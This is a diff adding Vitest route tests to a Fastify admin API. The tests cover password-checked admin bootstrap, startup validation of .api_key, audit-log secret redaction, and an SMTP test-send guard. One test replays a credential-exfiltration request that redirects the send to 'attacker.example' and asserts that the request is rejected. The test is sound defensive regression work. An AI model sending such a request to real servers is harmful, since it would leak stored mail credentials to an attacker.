@@ -4,6 +4,14 @@ import * as os from 'node:os';
 import * as path from 'node:path';
 import type { FastifyInstance } from 'fastify';
 
+// nodemailer is mocked so the smtp/test route tests below never touch a real
+// network socket — sendMail resolves instantly, and we can inspect exactly
+// which host/credential a real (non-guard-rejected) send would have used.
+interface TransportOptions { host: string; port: number; secure: boolean; auth: { user: string; pass: string } }
+const sendMail = vi.fn().mockResolvedValue(undefined);
+const createTransport = vi.fn((_opts: TransportOptions) => ({ sendMail }));
+vi.mock('nodemailer', () => ({ createTransport }));
+
 /**
  * Route-level integration tests via buildApp() + inject(). Each test gets a
  * fully isolated module graph (fresh DATA_DIR + vi.resetModules()) so no test
@@ -33,6 +41,8 @@ afterEach(async () => {
   delete process.env.DATA_DIR;
   delete process.env.NAGELLACKE_NO_AUTOSTART;
   delete process.env.ALLOW_REGISTRATION;
+  createTransport.mockClear();
+  sendMail.mockClear();
 });
 
 async function register(app: FastifyInstance, username: string, password = 'password123'): Promise<{ token: string }> {
@@ -89,6 +99,34 @@ describe('POST /api/admin/bootstrap', () => {
     expect(res.statusCode).toBe(400);
   });
 
+  it('promoting a pre-existing user requires that user\'s real password (PR #216 review item 2)', async () => {
+    const { app, dir, apiKey } = await createTestApp();
+    tmpDirs.push(dir);
+    // Create a plain (non-admin) user first, via open first-user registration.
+    await register(app, 'existing-user', 'correct-password');
+    // countAdmins() > 0 now (the first registered user is auto-promoted), so
+    // demote them again to exercise the "existing user, no admin yet" branch
+    // that /api/admin/bootstrap's existing-user promotion path guards.
+    const db = await import('./db');
+    db.setUserRole('existing-user', 'user');
+    expect(db.countAdmins()).toBe(0);
+
+    const wrongPassword = await app.inject({
+      method: 'POST', url: '/api/admin/bootstrap', headers: { 'x-api-key': apiKey },
+      payload: { username: 'existing-user', password: 'totally-wrong-pw' },
+    });
+    expect(wrongPassword.statusCode).toBe(401);
+    expect(db.isAdmin('existing-user')).toBe(false);
+
+    const rightPassword = await app.inject({
+      method: 'POST', url: '/api/admin/bootstrap', headers: { 'x-api-key': apiKey },
+      payload: { username: 'existing-user', password: 'correct-password' },
+    });
+    expect(rightPassword.statusCode).toBe(200);
+    expect((rightPassword.json() as { token?: string }).token).toBeTruthy();
+    expect(db.isAdmin('existing-user')).toBe(true);
+  });
+
   it('succeeds once and issues tokens; a second call 409s', async () => {
     const { app, dir, apiKey } = await createTestApp();
     tmpDirs.push(dir);
@@ -104,6 +142,26 @@ describe('POST /api/admin/bootstrap', () => {
       payload: { username: 'someone-else', password: 'password123' },
     });
     expect(second.statusCode).toBe(409);
+  });
+});
+
+describe('.api_key startup validation (PR #216 review item 3)', () => {
+  it('refuses to start (process.exit(1)) when .api_key exists but is empty, instead of failing open', async () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nagellacke-admin-test-'));
+    tmpDirs.push(dir);
+    fs.writeFileSync(path.join(dir, '.api_key'), '', { mode: 0o600 });
+    process.env.DATA_DIR = dir;
+    process.env.NAGELLACKE_NO_AUTOSTART = 'true';
+    process.env.NODE_ENV = 'test';
+    vi.resetModules();
+    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code?: number) => {
+      throw new Error(`process.exit(${code})`);
+    }) as never);
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    await expect(import('./index')).rejects.toThrow('process.exit(1)');
+    expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining('.api_key'));
+    exitSpy.mockRestore();
+    errorSpy.mockRestore();
   });
 });
 
@@ -196,6 +254,71 @@ describe('GET /api/admin/settings — secret masking', () => {
     const body = res.json() as { smtp: { hasPassword: boolean }; ai: { openrouter: { hasApiKey: boolean } } };
     expect(body.smtp.hasPassword).toBe(true);
     expect(body.ai.openrouter.hasApiKey).toBe(true);
+  });
+});
+
+describe('POST /api/admin/settings/smtp/test — credential exfiltration (PR #216 review item 1)', () => {
+  it('rejects a test-send to an attacker-controlled host without an explicit password, even with a real stored password saved', async () => {
+    const { app, dir } = await createTestApp();
+    tmpDirs.push(dir);
+    const { token } = await register(app, 'owner'); // first user = admin
+    const saveRes = await app.inject({
+      method: 'POST', url: '/api/admin/settings', headers: { authorization: `Bearer ${token}` },
+      payload: { smtp: { host: 'smtp.real.example', port: 587, user: 'real-user', pass: 'real-secret-pass', from: 'a@b.c' } },
+    });
+    expect(saveRes.statusCode).toBe(200);
+
+    // The exact exploit request from the PR #216 finding: an admin bearer
+    // token, no knowledge of the stored SMTP password, host redirected to
+    // an attacker-controlled destination.
+    const res = await app.inject({
+      method: 'POST', url: '/api/admin/settings/smtp/test', headers: { authorization: `Bearer ${token}` },
+      payload: { toEmail: 'x@evil.example', host: 'attacker.example', port: 2525, secure: false },
+    });
+    // Rejected by the credential-binding guard before any connection is even
+    // attempted — the real stored password never leaves the server, let
+    // alone travels to attacker.example.
+    expect(res.statusCode).toBe(502);
+    expect(res.body).not.toContain('real-secret-pass');
+    expect(createTransport).not.toHaveBeenCalled();
+  });
+
+  it('still allows a normal test-send that keeps the stored host/user (falls back to the stored password)', async () => {
+    const { app, dir } = await createTestApp();
+    tmpDirs.push(dir);
+    const { token } = await register(app, 'owner');
+    await app.inject({
+      method: 'POST', url: '/api/admin/settings', headers: { authorization: `Bearer ${token}` },
+      payload: { smtp: { host: 'smtp.real.example', port: 587, user: 'real-user', pass: 'real-secret-pass', from: 'a@b.c' } },
+    });
+    // No host/user override — this must reach the real send path (mocked
+    // nodemailer here) using the stored host and stored password.
+    const res = await app.inject({
+      method: 'POST', url: '/api/admin/settings/smtp/test', headers: { authorization: `Bearer ${token}` },
+      payload: { toEmail: 'x@ok.example' },
+    });
+    expect(res.statusCode).toBe(200);
+    expect(createTransport).toHaveBeenCalledTimes(1);
+    const cfg = createTransport.mock.calls[0][0];
+    expect(cfg.host).toBe('smtp.real.example');
+    expect(cfg.auth.pass).toBe('real-secret-pass');
+  });
+});
+
+describe('POST /api/admin/settings — secrets never reach the audit log (PR #216 review item 4)', () => {
+  it('a settings update containing a real secret value never persists that value in the audit log', async () => {
+    const { app, dir } = await createTestApp();
+    tmpDirs.push(dir);
+    const { token } = await register(app, 'owner');
+    await app.inject({
+      method: 'POST', url: '/api/admin/settings', headers: { authorization: `Bearer ${token}` },
+      payload: { smtp: { host: 'smtp.example.com', port: 587, user: 'u', pass: 'hunter2', from: 'a@b.c' } },
+    });
+    const res = await app.inject({ method: 'GET', url: '/api/admin/audit', headers: { authorization: `Bearer ${token}` } });
+    expect(res.statusCode).toBe(200);
+    expect(res.body).not.toContain('hunter2');
+    const body = res.json() as { entries: { action: string }[] };
+    expect(body.entries.some((e) => e.action === 'server_settings.updated')).toBe(true);
   });
 });
 
